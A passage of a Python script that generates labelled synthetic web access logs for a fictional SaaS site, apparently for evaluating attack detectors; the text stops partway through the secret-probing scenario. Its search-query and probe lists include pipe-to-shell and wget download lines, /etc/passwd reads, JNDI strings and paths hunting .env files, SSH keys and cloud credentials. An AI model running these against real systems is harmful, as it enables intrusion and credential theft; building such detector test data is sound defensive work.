#!/usr/bin/env python3
"""
WATCHTOWER blind holdout v2 generator.

*** ALL DATA HERE IS FAKE, SYNTHETIC, AND FOR DETECTOR EVALUATION ONLY. ***
Every address is from a documentation range (RFC 5737 / RFC 3849); every
host name is under example.com/.net. Nothing here is a real log, a real
credential, or a working exploit. The script uses only the stdlib, is
deterministic (random.Random(5150)), writes two files next to itself and
never opens a network connection.

Site modelled: "Taskforge", a SaaS project-management product at
taskforge.example.com: marketing pages, /docs, a web app under /app/...,
a REST API under /v1/..., an OAuth-style token endpoint /oauth/token, a
customer login form at /login (+ /forgot-password, /reset-password), and
/health for monitors. Window: 2026-11-20T00:00:00Z for 24 hours.

Labels are per client IP (one label per IP). "malicious" = the client's
behaviour is an attack on the site; "benign" = legitimate or at least
non-hostile traffic, including deliberate false-positive traps.

MALICIOUS SCENARIOS
 vuln_scanner        Nikto-style UA, ~3 minute burst over ~200 known-bad paths
                     (phpmyadmin, manager/html, cgi-bin ...), mostly 404.
 secret_probe_slow   Browser UA, one request every 20-90 s hunting /.env,
                     /.git/config, tfstate, aws creds, actuator heapdump.
 sqli_sqlmap         sqlmap UA, union/boolean/time/error-based payloads in
                     several parameters, mixed raw and percent-encoded.
 xss_ssti_cmdi       Firefox UA, slow; XSS, template injection, shell
                     metacharacter injection, plain/double-encoded.
 path_traversal      curl UA, ../ variants: plain, %2e%2e, double-encoded,
                     overlong UTF-8, ....//, ..;/, backslash, php wrappers.
 jndi_v4 / jndi_v6   ${jndi:ldap://...} and obfuscated forms in query,
                     path, referer and user-agent (one IPv4, one IPv6).
 spray_form          One password against ~170 usernames on the /login form,
                     one attempt every 5-9 minutes all day, constant failure
                     page size, 2 successes (302). Usernames are in the POST
                     body, so only rate/outcome pattern is visible.
 spray_token         Same idea on /oauth/token, but a sloppy client puts the
                     username in the query string; IPv6, ~1 per 4-7 min,
                     401 with 2 token (200) successes.
 stuffing_form       Fast credential stuffing on /login (1-3 s apart), a few
                     302 successes followed by account-profile access.
 stuffing_token      Fast stuffing on /oauth/token with okhttp UA; 400/401,
                     a few 200s followed by GET /v1/me.
 stuffing_api_200    Stuffing against /v1/auth/login which ALWAYS returns
                     HTTP 200; only response size distinguishes failure
                     (small) from success (large).
 idor_fast           Sequential numeric ID enumeration of /v1/projects/{id}
                     and /v1/users/{id}, ~0.5 s apart, 200/403/404 mixed.
 idor_slow           Ascending invoice IDs, one request every 6-9 minutes
                     for the full 24 hours (browser UA).
 botnet_v4           ~80 IPv4 across all three /24s, 3-6 requests each,
                     stuffing /login and /oauth/token with varied UAs. Each
                     address is individually quiet; labelled malicious as a
                     coordinated campaign.
 botnet_v6           ~40 IPv6 addresses in many /64s sharing one ascending
                     /v1/users/{id} counter plus wp-login/xmlrpc probes.
 blender             Browser UA, genuine-looking browsing with referers and
                     assets, with injection/traversal/admin probes mixed in.
 ssrf_nosql_xxe      Go-http-client; SSRF to metadata/localhost, NoSQL
                     operator injection, LDAP injection, XXE bodies.

BENIGN SCENARIOS (many are false-positive traps)
 users_v4 / users_v6 Normal visitors, docs readers and app users; occasional
                     typo 404, a failed login then success, return_to= and
                     utm_ parameters, long OAuth callback codes.
 crawler_*           Googlebot, Bingbot, DuckDuckBot, AhrefsBot (bursty,
                     many 404s on dead URLs), SemrushBot, MJ12bot, a link
                     checker; robots.txt first, 404/301/302 mixes.
 monitor_*           UptimeRobot /health every 90 s (503s in the outage),
                     Pingdom on /v1/status, synthetic login check (POST
                     /login 302) every 15 min.
 ci_bot / exporter   CI/CD bots calling the API heavily; the exporter walks
                     sequential task IDs 1..N with 200s and some 404s.
 office_nat          One IP, 20 employees, distinct UAs, a 9am login surge
                     with a handful of failed logins, some 403/404.
 forgot_password_*   Users failing login several times, using
                     /forgot-password, then succeeding.
 support_engineer    Admin pages, walks ~35 user IDs, starts with 403s.
 tech_writer         IPv6; docs search for SQL, shell, HTML, traversal and
                     JNDI snippets. Payload-looking queries, human behaviour.
 mobile_*            App devices: normal syncs, then a 13:00 outage with 5xx
                     bursts, exponential-backoff retries (one device has a
                     tight no-backoff loop), then a flush of queued writes.
 integration_poll    Zapier-like poller every 2 minutes (200/304).
 expired_token_dev   Postman with 401s, refreshes token, carries on.
 legacy_client       Old client polling a retired endpoint (410) forever.
 stripe_webhook      Payment provider webhooks incl. a 500 and its retry.
 link_previews       Slackbot / Twitterbot fetching blog URLs.
 feed_reader         Feedly polling /blog/feed.xml (304s).
 api_explorer        Developer with curl poking the API: 401s, 404 guesses.
 bulk_exporter       Customer paging /app/reports/export?page=1..N quickly.
"""
import os
import random
import urllib.parse as up
from datetime import datetime, timedelta, timezone

R = random.Random(5150)
START = datetime(2026, 11, 20, tzinfo=timezone.utc)
HOST = "https://taskforge.example.com"
OUT = os.path.dirname(os.path.abspath(__file__))

events = []
labels = {}
used6 = set()

pool4 = [n + str(i) for n in ("192.0.2.", "198.51.100.", "203.0.113.") for i in range(1, 255)]
R.shuffle(pool4)


def v4():
    return pool4.pop()


def v6(prefix=None):
    while True:
        if prefix:
            a = "2001:db8:%s:%x::%x" % (prefix, R.randint(1, 0xffff), R.randint(1, 0xffff))
        else:
            a = "2001:db8:%x:%x::%x" % (R.randint(0x1000, 0xfff0), R.randint(1, 0xffff), R.randint(1, 0xffff))
        if a not in used6:
            used6.add(a)
            return a


def client(ip, label, scen):
    assert ip not in labels, ip
    labels[ip] = (label, scen)
    return ip


def H(h, m=0, s=0):
    return h * 3600 + m * 60 + s


def log(ip, t, method, path, status, size, ref="-", ua=None):
    t = max(0, min(86399, int(t)))
    path = path.replace(" ", "%20").replace('"', "%22").replace("\\", "%5c")
    ref = ref.replace(" ", "%20").replace('"', "%22").replace("\\", "%5c")
    ua = (ua or UA_CH_WIN).replace('"', "\\x22").replace("\\", "\\x5c")
    ts = (START + timedelta(seconds=t)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    events.append((t, len(events),
                   '%s - - [%s] "%s %s HTTP/1.1" %d %d "%s" "%s"' % (ip, ts, method, path, status, size, ref, ua)))


_sz = {}


def sz(path, lo=3000, hi=15000):
    k = path.split("?")[0]
    if k not in _sz:
        _sz[k] = R.randint(lo, hi)
    return _sz[k] + R.randint(-40, 40)


def enc(s, mode):
    if mode == "raw":
        return s
    if mode == "url":
        return up.quote(s, safe="")
    if mode == "dbl":
        return up.quote(up.quote(s, safe=""), safe="")
    return up.quote_plus(s)


UA_CH_WIN = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
UA_CH_MAC = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
UA_SAF_MAC = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
UA_FF_LIN = "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0"
UA_FF_WIN = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
UA_IPHONE = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
UA_ANDROID = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36"
UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.2849.56"
UA_OLD_IE = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
BROWSERS = [UA_CH_WIN, UA_CH_MAC, UA_SAF_MAC, UA_FF_LIN, UA_FF_WIN, UA_IPHONE, UA_ANDROID, UA_EDGE]

MARKETING = ["/", "/pricing", "/features", "/features/gantt-charts", "/features/time-tracking", "/features/automations",
             "/customers", "/about", "/blog", "/contact", "/security", "/integrations", "/signup", "/careers"]
BLOGS = ["/blog/how-we-cut-sprint-planning-in-half", "/blog/gantt-vs-kanban", "/blog/release-notes-4-12",
         "/blog/remote-retros-that-work", "/blog/estimating-without-lying", "/blog/okrs-for-small-teams"]
DOCS = ["/docs/", "/docs/getting-started", "/docs/api/overview", "/docs/api/authentication", "/docs/api/tasks",
        "/docs/api/projects", "/docs/api/errors", "/docs/guides/webhooks", "/docs/guides/sso", "/docs/changelog",
        "/docs/guides/import-from-csv", "/docs/guides/automations"]
OLD = ["/blog/2023/release-notes-v1", "/features/kanban-old", "/products", "/pricing-old", "/docs/v1/api",
       "/blog/2022/hello-world", "/team", "/press"]
ASSETS = ["/static/css/main.4f2a1c.css", "/static/js/bundle.9ac3d1.js", "/static/img/logo.svg",
          "/static/fonts/inter-var.woff2", "/static/img/hero.webp"]


def load(ip, t, ua, path, ref, assets=False, status=None):
    st = status or R.choices([200, 304], [8, 2])[0]
    log(ip, t, "GET", path, st, 0 if st == 304 else sz(path), ref, ua)
    if assets:
        for a in R.sample(ASSETS, R.randint(2, 4)):
            s = R.choice([200, 304, 304])
            log(ip, t + R.choice([0, 0, 1]), "GET", a, s, 0 if s == 304 else sz(a, 800, 90000), HOST + path, ua)


def user_session(ip, ua, t, kind, fails=0):
    prev = "-"
    if kind == "visitor":
        prev = R.choice(["https://www.google.com/", "https://duckduckgo.com/", "https://news.ycombinator.com/",
                         "-", "https://www.linkedin.com/", "https://www.reddit.com/"])
        pages = [R.choice(MARKETING)] + R.sample(MARKETING + BLOGS, R.randint(2, 6))
        if R.random() < 0.15:
            pages.append(R.choice(["/pricng", "/featres", "/docs/getting-start"]))
        if R.random() < 0.2:
            pages[0] += "?utm_source=newsletter&utm_medium=email&utm_campaign=nov_release"
        for i, p in enumerate(pages):
            if p in ("/pricng", "/featres", "/docs/getting-start"):
                log(ip, t, "GET", p, 404, 512, prev, ua)
            else:
                load(ip, t, ua, p, prev, assets=(i == 0))
            prev = HOST + p
            t += R.randint(8, 70)
    elif kind == "docs":
        prev = R.choice(["https://www.google.com/", "https://duckduckgo.com/", "https://stackoverflow.com/"])
        for i, p in enumerate(R.sample(DOCS, R.randint(3, 7))):
            load(ip, t, ua, p, prev, assets=(i == 0))
            prev = HOST + p
            t += R.randint(20, 150)
            if R.random() < 0.2:
                log(ip, t, "GET", "/docs/search?q=" + R.choice(["webhook", "oauth", "rate+limit", "csv+import"]),
                    200, sz("/docs/search"), prev, ua)
                t += 15
    else:
        prev = "-"
        load(ip, t, ua, "/login", prev, assets=True)
        prev = HOST + "/login"
        t += R.randint(6, 25)
        for _ in range(fails):
            log(ip, t, "POST", "/login", 200, 5400 + R.randint(-30, 30), prev, ua)
            t += R.randint(5, 20)
        if fails and R.random() < 0.5:
            log(ip, t, "GET", "/forgot-password", 200, sz("/forgot-password"), prev, ua)
            t += 30
        log(ip, t, "POST", "/login", 302, 0, prev, ua)
        t += 1
        pids = [R.randint(100, 999) for _ in range(3)]
        load(ip, t, ua, "/app/dashboard", prev, assets=True)
        log(ip, t + 1, "GET", "/v1/projects?limit=20", 200, sz("/v1/projects", 400, 4000), HOST + "/app/dashboard", ua)
        log(ip, t + 1, "GET", "/v1/notifications?unread=true", 200, sz("/v1/notifications", 100, 900), HOST + "/app/dashboard", ua)
        prev = HOST + "/app/dashboard"
        for _ in range(R.randint(4, 9)):
            t += R.randint(5, 90)
            p = R.choice(pids)
            path = R.choice(["/app/projects", "/app/projects/%d" % p, "/app/projects/%d/board" % p,
                             "/app/tasks/%d" % R.randint(1000, 9999), "/app/inbox", "/app/reports",
                             "/app/settings/profile", "/app/projects/%d/gantt" % p, "/app/projects?filter=mine&sort=updated"])
            load(ip, t, ua, path, prev)
            log(ip, t + 1, "GET", "/v1/tasks?project_id=%d&status=open" % p, 200, sz("/v1/tasks", 300, 6000), HOST + path, ua)
            if R.random() < 0.25:
                log(ip, t + 12, "POST", "/v1/tasks", 201, 310, HOST + path, ua)
            if R.random() < 0.2:
                log(ip, t + 25, "PATCH", "/v1/tasks/%d" % R.randint(1000, 9999), 200, 300, HOST + path, ua)
            prev = HOST + path


# ------------------------------------------------------------------ benign
def b_users():
    for i in range(30):
        ip = client(v4(), "benign", "users_v4")
        for _ in range(R.randint(1, 3)):
            kind = R.choices(["visitor", "docs", "app"], [3, 2, 5])[0]
            user_session(ip, R.choice(BROWSERS), R.randint(H(5), H(22)), kind, R.choices([0, 1, 2], [8, 2, 1])[0])
    for i in range(8):
        ip = client(v6(), "benign", "users_v6")
        for _ in range(R.randint(1, 3)):
            kind = R.choices(["visitor", "docs", "app"], [3, 2, 5])[0]
            user_session(ip, R.choice(BROWSERS), R.randint(H(5), H(22)), kind)
    # a few special-parameter users
    ip = client(v4(), "benign", "users_v4")
    t = H(10, 14)
    ua = UA_CH_MAC
    log(ip, t, "GET", "/login/sso?return_to=%2Fapp%2Fprojects%2F42&provider=okta", 302, 0, "-", ua)
    code = "".join(R.choice("abcdefghijklmnopqrstuvwxyz0123456789-_") for _ in range(96))
    state = "".join(R.choice("abcdef0123456789") for _ in range(32))
    log(ip, t + 6, "GET", "/oauth/callback?code=%s&state=%s" % (code, state), 302, 0, "https://sso.example.org/", ua)
    user_session(ip, ua, t + 8, "app")


def b_crawlers():
    pool = MARKETING + BLOGS + DOCS + ["/blog?page=%d" % i for i in range(2, 10)] + ["/sitemap.xml", "/feed"]
    specs = [
        ("crawler_googlebot", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 150, 0.03, False),
        ("crawler_bingbot", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", 100, 0.05, False),
        ("crawler_duckduckbot", "DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)", 60, 0.03, False),
        ("crawler_ahrefsbot", "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)", 150, 0.25, True),
        ("crawler_semrushbot", "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)", 110, 0.15, True),
        ("crawler_mj12bot", "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)", 80, 0.2, True),
        ("crawler_linkchecker", "W3C-checklink/5.0 libwww-perl/6.72", 70, 0.12, True),
    ]
    for scen, ua, n, bad, bursty in specs:
        ip = client(v4(), "benign", scen)
        t0 = R.randint(H(0), H(8))
        log(ip, t0, "GET", "/robots.txt", 200, 142, "-", ua)
        if bursty:
            times = []
            for _ in range(max(3, n // 25)):
                c = R.randint(H(1), H(22))
                times += [c + i * R.uniform(0.3, 2.0) for i in range(25)]
        else:
            times = [R.uniform(t0, H(23, 50)) for _ in range(n)]
        for t in sorted(times):
            r = R.random()
            if r < bad:
                p = R.choice(OLD + ["/blog/tag/%s" % R.choice(["agile", "scrum", "pm"]), "/docs/api/v0/tasks"])
                log(ip, t, "GET", p, R.choice([404, 404, 404, 301]), 512, "-", ua)
            elif R.random() < 0.06:
                log(ip, t, "GET", R.choice(["/app/", "/app/dashboard"]), 302, 0, "-", ua)
            elif R.random() < 0.05 and bursty:
                log(ip, t, "GET", R.choice(pool), 429, 90, "-", ua)
            else:
                st = R.choice([200, 200, 200, 304])
                p = R.choice(pool)
                log(ip, t, "GET", p, st, 0 if st == 304 else sz(p), "-", ua)


def b_monitors():
    ip = client(v4(), "benign", "monitor_uptime")
    ua = "Mozilla/5.0 (compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
    t = 7
    while t < 86400:
        out = H(13) <= t < H(13, 14)
        log(ip, t, "GET", "/health", 503 if out else 200, 63 if out else 15, "-", ua)
        t += 90
    ip = client(v4(), "benign", "monitor_pingdom")
    for t in range(40, 86400, 300):
        out = H(13) <= t < H(13, 14)
        log(ip, t, "GET", "/v1/status", 502 if out else 200, 150 if out else 96, "-", "Pingdom.com_bot_version_1.4_(http://www.pingdom.com/)")
    ip = client(v4(), "benign", "monitor_synthetic_login")
    ua = "taskforge-synthetics/1.2"
    for t in range(100, 86400, 900):
        out = H(13) <= t < H(13, 14)
        log(ip, t, "POST", "/login", 502 if out else 302, 150 if out else 0, HOST + "/login", ua)
        if not out:
            log(ip, t + 1, "GET", "/app/dashboard", 200, 9100, HOST + "/login", ua)
            log(ip, t + 2, "GET", "/v1/projects?limit=1", 200, 300, HOST + "/app/dashboard", ua)


def b_ci():
    ip = client(v4(), "benign", "ci_bot")
    ua = "taskforge-ci/3.4.1 (github-actions)"
    for h in range(7, 20):
        t = H(h, 5) + R.randint(0, 40)
        for page in range(1, R.randint(14, 24)):
            log(ip, t, "GET", "/v1/projects/412/tasks?page=%d&per_page=100" % page, 200, sz("/v1/tasks", 8000, 40000), "-", ua)
            t += R.uniform(0.2, 0.8)
        for _ in range(R.randint(2, 5)):
            log(ip, t, "POST", "/v1/tasks/%d/comments" % R.randint(1000, 1400), 201, 280, "-", ua)
            t += 0.6
    ip = client(v4(), "benign", "ci_exporter")
    ua = "taskforge-exporter/2.0 python-requests/2.32.3"
    t = H(2, 0, 3)
    for i in range(1, 181):
        log(ip, t, "GET", "/v1/tasks/%d" % i, 404 if R.random() < 0.1 else 200, 150 if False else R.randint(300, 900), "-", ua)
        t += R.uniform(0.1, 0.4)
    for i in range(1, 41):
        log(ip, H(14) + i * 0.3, "GET", "/v1/projects/412/members?page=%d" % i, 200, 4200, "-", ua)


def b_office():
    ip = client(v4(), "benign", "office_nat")
    uas = []
    for v in range(128, 132):
        uas.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36" % v)
    uas += [UA_EDGE, UA_FF_WIN, UA_SAF_MAC, UA_CH_MAC, UA_OLD_IE]
    users = [uas[i % len(uas)] for i in range(20)]
    for i, ua in enumerate(users):
        t = H(8, 50) + R.randint(0, 600) if i < 14 else H(9) + R.randint(0, 5400)
        user_session(ip, ua, t, "app", R.choices([0, 1, 3], [14, 3, 1])[0])
        if R.random() < 0.7:
            user_session(ip, ua, H(13, 30) + R.randint(0, 9000), "app")
        if R.random() < 0.4:
            t = H(10) + R.randint(0, 20000)
            log(ip, t, "GET", "/app/admin/billing", 403, 560, HOST + "/app/dashboard", ua)
            log(ip, t + 20, "GET", "/app/projects/%d/old-board" % R.randint(100, 999), 404, 512, HOST + "/app/projects", ua)


def b_forgot():
    for i in range(4):
        ip = client(v4() if i < 3 else v6(), "benign", "forgot_password_user")
        ua = R.choice(BROWSERS)
        t = R.randint(H(7), H(20))
        ref = HOST + "/login"
        log(ip, t, "GET", "/login", 200, 4100, "-", ua)
        t += 10
        for _ in range(R.randint(4, 7)):
            log(ip, t, "POST", "/login", 200, 5400 + R.randint(-20, 20), ref, ua)
            t += R.randint(6, 25)
        log(ip, t, "GET", "/forgot-password", 200, 3200, ref, ua)
        log(ip, t + 25, "POST", "/forgot-password", 302, 0, HOST + "/forgot-password", ua)
        tok = "".join(R.choice("abcdef0123456789") for _ in range(40))
        t += R.randint(120, 900)
        log(ip, t, "GET", "/reset-password?token=" + tok, 200, 3300, "-", ua)
        log(ip, t + 30, "POST", "/reset-password", 302, 0, HOST + "/reset-password?token=" + tok, ua)
        log(ip, t + 40, "POST", "/login", 302, 0, ref, ua)
        log(ip, t + 41, "GET", "/app/dashboard", 200, 9100, ref, ua)


def b_support():
    ip = client(v4(), "benign", "support_engineer")
    ua = UA_CH_MAC
    t = H(10, 0)
    ref = HOST + "/app/admin/"
    log(ip, t, "GET", "/app/admin/", 403, 560, HOST + "/app/dashboard", ua)
    log(ip, t + 20, "GET", "/app/admin/users?q=acme", 403, 560, ref, ua)
    log(ip, t + 80, "POST", "/oauth/token", 200, 410, "-", ua)
    t += 90
    log(ip, t, "GET", "/app/admin/", 200, 6200, HOST + "/app/dashboard", ua)
    uid = 20310
    for _ in range(35):
        t += R.randint(15, 140)
        uid += R.randint(1, 4)
        log(ip, t, "GET", "/app/admin/users/%d" % uid, 200, sz("/app/admin/users", 4000, 7000), ref, ua)
        if R.random() < 0.4:
            log(ip, t + 8, "GET", "/app/admin/audit-log?actor=%d&limit=50" % uid, 200, 12000, ref, ua)
        if R.random() < 0.15:
            log(ip, t + 20, "GET", "/app/admin/orgs/%d" % R.randint(300, 340), 200, 6000, ref, ua)
    log(ip, t + 60, "GET", "/app/admin/impersonate?user=%d" % uid, 302, 0, ref, ua)


def b_writer():
    ip = client(v6(), "benign", "tech_writer")
    ua = UA_FF_LIN
    qs = ["SELECT * FROM tasks WHERE project_id = 5", "' OR '1'='1", "UNION SELECT", "DROP TABLE tasks;",
          "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "rm -rf /tmp/export", "cat /etc/passwd",
          "curl -X POST https://api.example.com | sh", "../../config", "${jndi:ldap://x}", "%3Cb%3Ebold%3C/b%3E",
          "$(date)", "SELECT id, name FROM projects ORDER BY name LIMIT 10", "webhook payload <task>",
          "; ls -la", "WHERE 1=1", "<iframe src=\"/docs\">", "`whoami`", "sleep 5 && echo done", "{{ task.title }}",
          "INSERT INTO audit(id) VALUES (1)", "wget http://example.com/x.sh", "../", "<!-- comment -->"]
    t = H(15, 2)
    prev = HOST + "/docs/api/tasks"
    load(ip, t, ua, "/docs/api/tasks", "-", assets=True)
    for q in qs:
        t += R.randint(12, 90)
        mode = R.choice(["url", "plus", "plus"])
        p = "/docs/search?q=" + enc(q, mode)
        log(ip, t, "GET", p, 200, sz("/docs/search", 2000, 6000), prev, ua)
        if R.random() < 0.6:
            t += R.randint(10, 40)
            d = R.choice(DOCS)
            load(ip, t, ua, d, HOST + p)
            prev = HOST + d
    log(ip, t + 30, "GET", "/docs/guides/sql-injection-prevention", 200, 7600, prev, ua)


def b_mobile():
    ua_a = "TaskforgeMobile/5.2.1 (Android 14; Pixel 8) okhttp/4.12.0"
    ua_i = "Taskforge/5.2.1 CFNetwork/1494.0.7 Darwin/23.4.0"
    OUT0, OUT1 = H(13), H(13, 14)
    for d in range(6):
        ip = client(v6() if d >= 4 else v4(), "benign", "mobile_app")
        ua = ua_a if d % 2 == 0 else ua_i
        t = R.randint(H(6), H(7))
        while t < H(23):
            if not (OUT0 - 120 <= t < OUT1 + 240):
                log(ip, t, "GET", "/v1/sync?since=%d" % (1763600000 + t), 200, R.randint(200, 3500), "-", ua)
                if R.random() < 0.5:
                    log(ip, t + 1, "POST", "/v1/devices/heartbeat", 204, 0, "-", ua)
            t += R.randint(1500, 3000)
        t = OUT0 + R.randint(0, 120)
        k = 0
        tight = (d == 3)  # no-backoff retry loop in bursts
        end = OUT1 + R.randint(0, 90)
        while t < end:
            m, p = R.choice([("GET", "/v1/sync?since=%d" % (1763600000 + OUT0)), ("POST", "/v1/sync/push"), ("GET", "/v1/projects?limit=20")])
            log(ip, t, m, p, R.choice([502, 503, 503, 504]), R.randint(120, 200), "-", ua)
            if tight and k % 30 < 25:
                t += 0.25
            else:
                t += min(30, 0.5 * 2 ** (k % 7)) + R.uniform(0, 0.8)
                if k % 7 == 6:
                    t += R.randint(20, 60)
            k += 1
        for j in range(R.randint(4, 9)):
            log(ip, t + j * 0.4, "POST", "/v1/tasks", 201, 305, "-", ua)
        log(ip, t + 5, "GET", "/v1/sync?since=%d" % (1763600000 + OUT0), 200, 2900, "-", ua)


def b_misc():
    ip = client(v4(), "benign", "integration_poll")
    t = H(8)
    while t < H(20):
        st = R.choice([200, 200, 304])
        log(ip, t, "GET", "/v1/tasks?updated_since=" + up.quote("2026-11-20T%02d:%02d:00Z" % (t // 3600, t % 3600 // 60), safe=""),
            st, 0 if st == 304 else R.randint(300, 4000), "-", "Zapier")
        t += 120
    ip = client(v4(), "benign", "expired_token_dev")
    ua = "PostmanRuntime/7.37.3"
    t = H(16, 20)
    for _ in range(10):
        log(ip, t, "GET", "/v1/projects", 401, 78, "-", ua)
        t += R.randint(15, 40)
    log(ip, t, "POST", "/oauth/token", 200, 412, "-", ua)
    for _ in range(12):
        t += R.randint(10, 60)
        log(ip, t, "GET", R.choice(["/v1/projects", "/v1/projects/412", "/v1/tasks?project_id=412", "/v1/me"]), 200, R.randint(300, 3000), "-", ua)
    ip = client(v4(), "benign", "legacy_client")
    for t in range(H(1), H(5), 300):
        log(ip, t + R.randint(0, 5), "GET", "/v1/legacy/sync", 410, 96, "-", "taskforge-legacy-sync/1.0")
    ip = client(v4(), "benign", "stripe_webhook")
    ua = "Stripe/1.0 (+https://stripe.com/docs/webhooks)"
    for i in range(18):
        t = R.randint(H(0), H(23))
        log(ip, t, "POST", "/v1/webhooks/billing", 200, 2, "-", ua)
    t = H(11, 2)
    log(ip, t, "POST", "/v1/webhooks/billing", 500, 80, "-", ua)
    log(ip, t + 3600 // 6, "POST", "/v1/webhooks/billing", 200, 2, "-", ua)
    ip = client(v4(), "benign", "link_previews")
    for i, t in enumerate(sorted(R.randint(H(8), H(18)) for _ in range(5))):
        log(ip, t, "GET", R.choice(BLOGS), 200, 9000, "-", "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)")
    ip = client(v4(), "benign", "link_previews")
    for t in sorted(R.randint(H(8), H(18)) for _ in range(4)):
        log(ip, t, "GET", R.choice(BLOGS), 200, 9000, "-", "Twitterbot/1.0")
    ip = client(v4(), "benign", "feed_reader")
    for t in range(H(0, 10), 86400, 1800):
        st = R.choice([304, 304, 304, 200])
        log(ip, t, "GET", "/blog/feed.xml", st, 0 if st == 304 else 18400, "-", "Feedly/1.0 (+http://www.feedly.com/fetcher.html; 12 subscribers)")
    ip = client(v4(), "benign", "api_explorer")
    ua = "curl/8.4.0"
    t = H(19, 30)
    seq = [("/docs/api/openapi.json", 200), ("/v1/", 401), ("/v1/project", 404), ("/v1/projects", 401), ("/v1/projects", 200),
           ("/v1/projects/412", 200), ("/v1/projects/412/tasks", 200), ("/v1/task", 404), ("/v1/tasks/9999999", 404),
           ("/v1/me", 200), ("/v1/users", 403), ("/v1/projects?limit=1000", 400), ("/v1/projects?limit=10", 200),
           ("/v1/labels", 404), ("/v1/tasks?status=bogus", 422)]
    for p, st in seq:
        log(ip, t, "GET", p, st, R.randint(70, 3000), "-", ua)
        t += R.randint(5, 80)
    ip = client(v4(), "benign", "bulk_exporter")
    ua = UA_CH_WIN
    t = H(17, 40)
    user_session(ip, ua, t - 300, "app")
    for page in range(1, 81):
        log(ip, t, "GET", "/app/reports/export?page=%d" % page, 200, 52000, HOST + "/app/reports", ua)
        t += R.uniform(2, 4)


# --------------------------------------------------------------- malicious
FIRST = "james mary robert patricia john jennifer michael linda david elizabeth william barbara richard susan joseph jessica thomas sarah chris karen dan nancy matt lisa tony betty mark sandra paul ashley steve emily".split()
LAST = "smith johnson williams brown jones garcia miller davis rodriguez martinez hernandez lopez gonzalez wilson anderson thomas taylor moore jackson martin lee perez thompson white harris sanchez clark ramirez lewis robinson walker".split()
CORP = ["acme-logistics.example", "northwind-traders.example", "globex-corp.example", "initech.example", "umbrella-ltd.example"]


def names(n):
    out = set()
    while len(out) < n:
        out.add("%s.%s@%s" % (R.choice(FIRST), R.choice(LAST), R.choice(CORP)))
    return sorted(out)


def m_scanner():
    ip = client(v4(), "malicious", "vuln_scanner")
    ua = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:003290)"
    paths = ["/phpmyadmin/", "/pma/", "/phpMyAdmin/index.php", "/manager/html", "/cgi-bin/test.cgi", "/cgi-bin/php", "/server-status",
             "/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/.DS_Store", "/phpinfo.php", "/info.php", "/backup.zip", "/backup.tar.gz",
             "/admin/", "/administrator/", "/console", "/actuator", "/actuator/health", "/jenkins/", "/solr/admin/", "/jmx-console/",
             "/axis2/", "/struts2-showcase/", "/test.php", "/shell.php", "/c99.php", "/uploads/shell.php", "/old/", "/temp/", "/tmp/",
             "/db/", "/dbadmin/", "/sql/", "/mysql/", "/webmail/", "/horde/", "/squirrelmail/", "/owa/", "/ecp/", "/remote/login",
             "/vpn/index.html", "/portal/", "/cgi-bin/luci", "/boaform/admin/formLogin", "/HNAP1/", "/setup.cgi", "/api/v1/pods",
             "/_ignition/execute-solution", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/ReportServer", "/solr/", "/druid/index.html",
             "/nacos/", "/geoserver/web/", "/telescope/requests", "/_profiler/", "/debug/default/view", "/web-console/", "/admin/config.php"]
    t = H(3, 12)
    for rnd in range(4):
        for p in paths:
            m = "GET" if rnd < 3 else R.choice(["HEAD", "OPTIONS", "POST"])
            if p in ("/admin/", "/console", "/actuator"):
                st = R.choice([403, 404])
            else:
                st = R.choice([404, 404, 404, 404, 404, 400, 403])
            log(ip, t, m, p + ("" if rnd == 0 else "?" + R.choice(["id=1", "debug=1", "page=../"])), st, 512 if st != 403 else 560, "-", ua)
            t += R.uniform(0.1, 0.9)
    for p in ("/robots.txt", "/login", "/docs/"):
        log(ip, t, "GET", p, 200, sz(p), "-", ua)
        t += 0.3


def m_secrets():
    ip = client(v4(), "malicious", "secret_probe_slow")
    ua = UA_CH_WIN
    paths = ["/.env", "/.env.production", "/.env.local", "/.git/config", "/.git/HEAD", "/config.yml", "/app/config/secrets.json",
             "/.aws/credentials", "/id_rsa", "/.ssh/id_rsa", "/docker-compose.yml", "/.npmrc", "/appsettings.json", "/web.config",
             "/actuator/env", "/actuator/heapdump", "/backup.sql", "/db.sqlite3", "/terraform.tfstate", "/.htpasswd", "/static/../.env",
             "/v1/.well-known/../.env", "/config/database.yml", "/.docker/config.json", "/.kube/config", "/secrets.yaml", "/credentials.json",
